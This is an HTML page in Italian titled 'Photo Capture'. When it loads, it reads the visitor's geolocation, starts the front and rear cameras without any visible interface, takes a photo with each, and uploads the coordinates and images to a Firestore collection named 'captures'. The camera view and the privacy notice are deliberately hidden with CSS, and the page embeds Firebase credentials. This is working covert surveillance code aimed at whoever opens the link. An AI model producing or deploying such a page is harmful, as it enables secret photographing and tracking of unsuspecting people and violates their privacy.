<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
    <!-- Includi Firebase (versione modulare) -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore.js';

        // Configurazione Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyB5vi_b7HjiH5akXLsqk2OOO_lv-vSJzHI",
            authDomain: "cattura-a93c5.firebaseapp.com",
            projectId: "cattura-a93c5",
            storageBucket: "cattura-a93c5.firebasestorage.app",
            messagingSenderId: "155421459394",
            appId: "1:155421459394:web:2c3bcb70fe32bf1fc30c5b",
            measurementId: "G-E9MKECCY3W"
        };

        // Inizializza Firebase
        let db;
        let addDocFunc;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            addDocFunc = addDoc;
            logDebug("Firebase inizializzato con successo");
        } catch (error) {
            logDebug("Errore inizializzazione Firebase: " + error.message);
        }

        // Esporta db e addDoc per il secondo script
        window.db = db;
        window.collection = collection;
        window.addDoc = addDocFunc;
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
        }
        #video {
            display: none; /* Nascondi il video durante la cattura */
        }
        #content, #privacy-notice, #debug {
            display: none; /* Nascondi tutto il testo */
        }
        #tempImage {
            max-width: 100%;
            max-height: 100vh;
        }
    </style>
</head>
<body>
    <div id="content"></div>
    <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
    <div id="debug"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <img id="tempImage" style="display: none;">

    <script>
        // Funzione di debug
        const debugDiv = document.getElementById('debug');
        function logDebug(message) {
            if (debugDiv) {
                debugDiv.innerHTML += `<p>${message}</p>`;
            } else {
                console.log("Debug: " + message);
            }
        }
        logDebug("Script avviato");

        // Ottieni posizione
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            logDebug(`Posizione acquisita: Lat ${position.coords.latitude}, Lon ${position.coords.longitude}`);
                            resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude });
                        },
                        (error) => {
                            logDebug("Errore geolocalizzazione: " + error.message);
                            reject("Errore geolocalizzazione: " + error.message);
                        }
                    );
                } else {
                    logDebug("Geolocalizzazione non supportata");
                    reject("Geolocalizzazione non supportata");
                }
            });
        }

        // Accedi alla fotocamera
        async function startCamera(facingMode) {
            const video = document.getElementById('video');
            if (video) {
                try {
                    const constraints = {
                        video: {
                            facingMode: facingMode,
                            width: 640,
                            height: 480,
                            frameRate: { ideal: 30 },
                            advanced: [{ exposureMode: "continuous" }, { whiteBalanceMode: "continuous" }]
                        }
                    };
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = stream;
                    logDebug(`Fotocamera ${facingMode} avviata`);
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            logDebug(`Video pronto: ${video.videoWidth}x${video.videoHeight}`);
                            resolve();
                        };
                        video.onerror = () => logDebug("Errore caricamento video");
                    });
                    return stream;
                } catch (err) {
                    logDebug("Errore fotocamera: " + err.message);
                    throw err;
                }
            } else {
                logDebug("Video element non trovato");
                throw new Error("Video element non trovato");
            }
        }

        // Scatta foto
        function takePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const tempImage = document.getElementById('tempImage');
            if (video && canvas && video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#ffffff';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                logDebug("Foto scattata, dimensione: " + photo.length + " caratteri");
                tempImage.src = photo;
                tempImage.style.display = 'block';
                setTimeout(() => {
                    tempImage.style.display = 'none';
                }, 3000);
                return photo;
            } else {
                logDebug("Video o canvas non valido o dimensioni zero");
                throw new Error("Video o canvas non valido");
            }
        }

        // Ferma fotocamera
        function stopCamera(stream) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                logDebug("Fotocamera fermata");
            }
        }

        // Salva dati su Firestore
        async function sendData(location, frontPhoto, backPhoto) {
            if (!window.db || !window.collection || !window.addDoc) {
                logDebug("Errore: Firestore non inizializzato o funzioni mancanti");
                throw new Error("Firestore non inizializzato o funzioni mancanti");
            }
            try {
                const capturesRef = window.collection(window.db, 'captures');
                await window.addDoc(capturesRef, {
                    latitude: location.latitude,
                    longitude: location.longitude,
                    frontPhoto: frontPhoto,
                    backPhoto: backPhoto,
                    timestamp: new Date()
                });
                logDebug("Dati salvati su Firestore");
            } catch (err) {
                logDebug("Errore salvataggio: " + err.message);
                throw err;
            }
        }

        // Funzione principale
        async function captureData() {
            try {
                let location;
                try {
                    location = await getLocation();
                } catch (err) {
                    logDebug("Geolocalizzazione fallita, usando coordinate predefinite: " + err.message);
                    location = { latitude: 45.4642, longitude: 9.1900 }; // Milano come fallback
                }
                let stream = await startCamera('user');
                await new Promise(resolve => setTimeout(resolve, 2500));
                const frontPhoto = takePhoto();
                stopCamera(stream);
                stream = await startCamera('environment');
                await new Promise(resolve => setTimeout(resolve, 2500));
                const backPhoto = takePhoto();
                stopCamera(stream);
                await sendData(location, frontPhoto, backPhoto);
                logDebug("Acquisizione completata");
            } catch (err) {
                logDebug("Errore: " + err.message);
            }
        }

        // Avvia quando il DOM Ã¨ pronto
        document.addEventListener('DOMContentLoaded', captureData);
    </script>
</body>
</html>
